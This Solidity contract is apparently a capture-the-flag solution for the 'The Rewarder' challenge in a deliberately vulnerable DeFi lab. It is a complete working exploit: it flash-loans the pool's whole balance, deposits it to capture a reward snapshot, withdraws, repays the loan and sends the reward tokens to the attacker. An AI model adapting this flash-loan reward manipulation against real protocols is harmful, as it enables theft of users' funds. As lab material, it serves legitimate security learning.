// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "hardhat/console.sol";
import "./RewardToken.sol";

contract AttackRewarder {
    DamnValuableToken public immutable liquidityToken;
    TheRewarderPool public rewardsPool;
    FlashLoanerPool public flashLoanerPool;
    RewardToken public rewardToken;
    address public _attacker;

    constructor(address _liquidityTokenAddress, address _rewardsPool, address _flashLoanerPool, address _rewardToken) {
        liquidityToken = DamnValuableToken(_liquidityTokenAddress);
        rewardsPool = TheRewarderPool(_rewardsPool);
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        rewardToken = RewardToken(_rewardToken);
    }

    function execute() public  {
        // take out flash loan
        _attacker = msg.sender;
        uint flashLoanAmount = liquidityToken.balanceOf(address(flashLoanerPool));
        flashLoanerPool.flashLoan(flashLoanAmount);
    }

    function receiveFlashLoan(uint256 _amount) public {
        // execute what you want to do with the tokens here that you get flash loaned
        liquidityToken.approve(address(rewardsPool), _amount);
        rewardsPool.deposit(_amount);
        rewardsPool.withdraw(_amount);
        liquidityToken.transfer(address(flashLoanerPool), _amount);

        // transfer all the rewards to our attacker address
        uint rewardsAmount = rewardToken.balanceOf(address(this));
        rewardToken.transfer(_attacker, rewardsAmount);
    }
}